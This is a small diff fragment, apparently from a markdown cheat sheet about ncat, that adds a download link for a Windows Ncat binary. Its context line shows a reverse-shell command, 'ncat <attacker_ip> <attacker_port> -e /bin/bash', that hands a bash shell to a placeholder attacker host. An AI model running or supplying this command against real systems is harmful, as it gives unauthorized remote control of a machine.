@@ -133,3 +133,8 @@ ncat <attacker_ip> <attacker_port> -e /bin/bash
 
 ___
 <!-- }}} -->
+
+## Download
+
+Windows binary version of
+[Ncat 5.59BETA1](https://nmap.org/dist/ncat-portable-5.59BETA1.zip)
